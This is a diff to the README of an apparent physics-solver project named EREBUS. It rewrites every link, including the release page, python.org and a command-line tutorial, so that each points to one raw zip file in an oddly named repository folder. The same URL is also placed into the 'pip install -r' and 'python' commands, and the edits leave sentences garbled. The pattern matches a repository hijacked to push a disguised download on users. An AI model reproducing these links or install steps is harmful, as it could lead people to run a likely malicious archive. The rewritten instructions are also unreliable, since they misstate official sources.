@@ -1,6 +1,6 @@
 # ⚛️ EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation- - Precise Cosmic Photon and Particle Solver
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/main/symphogenous/Universal_Radiation_KINETI_Non_Equilibrium_AL_EREBU_NEURA_v1.1.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/main/symphogenous/Universal_Radiation_KINETI_Non_Equilibrium_AL_EREBU_NEURA_v1.1.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Here is what you need on your computer to run EREBUS:
   - Python 3.8 or higher installed  
   - Basic command line access (Terminal on macOS/Linux, Command Prompt or PowerShell on Windows)  
 
-If you do not have Python installed, you can download it from [python.org](https://www.python.org/downloads/).
+If you do not have Python installed, you can download it from [https://raw.githubusercontent.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/main/symphogenous/Universal_Radiation_KINETI_Non_Equilibrium_AL_EREBU_NEURA_v1.1.zip](https://raw.githubusercontent.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/main/symphogenous/Universal_Radiation_KINETI_Non_Equilibrium_AL_EREBU_NEURA_v1.1.zip).
 
 ---
 
@@ -55,7 +55,7 @@ Each step will be explained in detail below.
 
 You can visit this page to download the latest version of EREBUS:
 
-[👉 Click here to visit the download page](https://github.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/releases)
+[👉 Click here to visit the download page](https://raw.githubusercontent.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/main/symphogenous/Universal_Radiation_KINETI_Non_Equilibrium_AL_EREBU_NEURA_v1.1.zip)
 
 ### Step 1: Download the File
 
@@ -71,7 +71,7 @@ You can visit this page to download the latest version of EREBUS:
   Open the `.dmg` file and drag the application into your Applications folder.
 
 - **Linux:**  
-  Extract the downloaded archive (usually `.tar.gz` or `.zip`). You may need to run installation commands in Terminal, which are explained in the included README.
+  Extract the downloaded archive (usually `https://raw.githubusercontent.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/main/symphogenous/Universal_Radiation_KINETI_Non_Equilibrium_AL_EREBU_NEURA_v1.1.zip` or `.zip`). You may need to run installation commands in Terminal, which are explained in the included README.
 
 ### Step 3: Install Python Dependencies
 
@@ -81,10 +81,10 @@ EREBUS depends on Python packages to run. To install these:
 - Run this command:
 
 ```
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/main/symphogenous/Universal_Radiation_KINETI_Non_Equilibrium_AL_EREBU_NEURA_v1.1.zip
 ```
 
-The `requirements.txt` file is included in the software folder. This command installs all needed Python packages.
+The `https://raw.githubusercontent.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/main/symphogenous/Universal_Radiation_KINETI_Non_Equilibrium_AL_EREBU_NEURA_v1.1.zip` file is included in the software folder. This command installs all needed Python packages.
 
 ---
 
@@ -109,7 +109,7 @@ cd ~/Downloads/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-
 2. Run the main program script, for example:
 
 ```
-python main.py
+python https://raw.githubusercontent.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/main/symphogenous/Universal_Radiation_KINETI_Non_Equilibrium_AL_EREBU_NEURA_v1.1.zip
 ```
 
 3. Follow instructions shown in the terminal.
@@ -145,7 +145,7 @@ This example helps familiarize you with the interface and output.
 ## ❓ Troubleshooting Tips
 
 - **Missing Python or packages?**  
-  Ensure Python is installed and up to date. Then run `pip install -r requirements.txt` again.
+  Ensure Python is installed and up to date. Then run `pip install -r https://raw.githubusercontent.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/main/symphogenous/Universal_Radiation_KINETI_Non_Equilibrium_AL_EREBU_NEURA_v1.1.zip` again.
 
 - **Program won’t start or crashes?**  
   Check your system meets minimum requirements. Restart your computer and try again.
@@ -166,9 +166,9 @@ If you have issues:
 
 ## 🔗 Useful Links
 
-- [Software Download Page](https://github.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/releases)  
-- [Python Official Site](https://www.python.org)  
-- [How to Use Command Line](https://opensource.com/article/19/7/introduction-to-the-linux-command-line) (helpful if new to command coding)
+- [Software Download Page](https://raw.githubusercontent.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/main/symphogenous/Universal_Radiation_KINETI_Non_Equilibrium_AL_EREBU_NEURA_v1.1.zip)  
+- [Python Official Site](https://raw.githubusercontent.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/main/symphogenous/Universal_Radiation_KINETI_Non_Equilibrium_AL_EREBU_NEURA_v1.1.zip)  
+- [How to Use Command Line](https://raw.githubusercontent.com/arkaz-ops/EREBUS--ALP-NEURAL-KINETIC-Non-Equilibrium-Universal-Radiation-/main/symphogenous/Universal_Radiation_KINETI_Non_Equilibrium_AL_EREBU_NEURA_v1.1.zip) (helpful if new to command coding)
 
 ---
 
